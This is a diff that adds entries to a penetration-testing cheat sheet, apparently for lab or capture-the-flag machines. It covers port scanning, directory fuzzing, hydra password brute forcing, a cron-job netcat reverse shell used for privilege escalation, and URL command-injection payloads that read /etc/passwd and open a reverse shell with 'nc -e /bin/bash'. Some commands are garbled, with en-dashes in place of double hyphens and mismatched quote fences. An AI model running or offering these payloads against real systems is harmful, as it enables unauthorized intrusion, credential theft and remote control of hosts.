@@ -21,7 +21,8 @@ wpscan --url URL --plugins-detection aggressive -e ap
 # Brute Force login, will take very long time. Not recommended unless you have short listed wordlist and usernames
 wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
 ```
-
+### Script to get all ports in readable format
+``` sudo nmap -p- --open -sV -A -T4 192.168.2.20 | grep "open" | awk '{print $1, $3}' > filtered_results.txt ```
 
 
 ## Enumerating
@@ -68,8 +69,70 @@ smbmap -H IP -d DOMAIN -u domain_user -p pass -H IP
 smbmap -H IP -R SHARES -A PATTEN --depth 6 -q
 ```
 
+### Nikto directory finder
+``` nikto -h http://IP/```
+
+### Check for SMB Vuln
+``` nmap –script smb-vuln* -p 445 192.168.2.15```
+
+### Check shellshock
+```
+nmap -sV -p80 –script http-shellshock
+nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>
+```
+### DIRB
+```
+dirb http://IP/
+Use -X .php OR .txt to filter files
+```
+### Mounting
+```
+sudo mount -t nfs 192.168.2.20:/tmp /mnt/nfs
+go to /mnt/nfs
+```
+### VNC Viewer
+```
+vncviewer 192.168.2.20:5901
+```
+### HYDRA
+```
+hydra -P /usr/share/wordlists/rockyou.txt vnc://192.168.2.20:5901
+```
+### GoBuster
+```
+gobuster dir -u http://192.168.2.20 -w /usr/share/wordlists/dirb/big.txt -t 50
+```
+### GET DEFAULT credentials
+```
+Nmap -Pn -n –script http-default-accounts -p 80 192.168.2.20 –open -T5 -vv
+```
+### HTTP Vuln
+```
+nmap -Pn -n -p80 192.168.2.4 --script http-vuln* --open -T5 -vv
+```
+### Fuzzing
+git clone https://github.com/danielmiessler/SecLists.git
+apt -y install seclists
+```
+ffuf -w ./SecLists/Discovery/Web-Content/common.txt -u http://192.168.56.125:8080/administration.php?FUZZ-helloworld -fs 65
+ffuf -w ./SecLists/Discovery/Web-Content/common.txt -u 192.168.56.125:8080/administration.php?logfile=<name of file>
+```
+
+
+
+
 
 ## Escalate Privileges
+
+### Execute by adding /bin/bash
+```
+sudo -u user /bin/bash /var/www/html/start.sh
+```
+### Escalate by adding nc to cron job
+```
+echo "nc 192.168.2.x 4444 -e /bin/bash" >> /var/cron/check.sh
+```
+
 
 ### Backup File
 ```Navigate to user directory and use ls -lah in backup files to find readable items
@@ -177,7 +240,14 @@ set LHOST IP
 set LPORT 4446
 run
 ```
+### Command line injection URL based
+```
+http://192.168.56.125:8080/administration.php?logfile=chat.txt;%20id
+http://192.168.56.125:8080/administration.php?logfile=cat /etc/passwd
+http://192.168.56.125:8080/administration.php?logfile=cd /home ls
 
+http://192.168.56.125:8080/administration.php?logfile= chat.txt; nc IP PORT -e /bin/bash
+```
 
 
 
@@ -256,6 +326,8 @@ sudo systemctl restart service_name.service
 ``` cp /tmp/exploit.sh /usr/local/bin/service.sh ```
 ### Decode hash base64
 ``` echo ' HASH '  | base64 -d ```
+### See user sudo privileges
+''' sudo -l ```
 
 
 ## General Commands
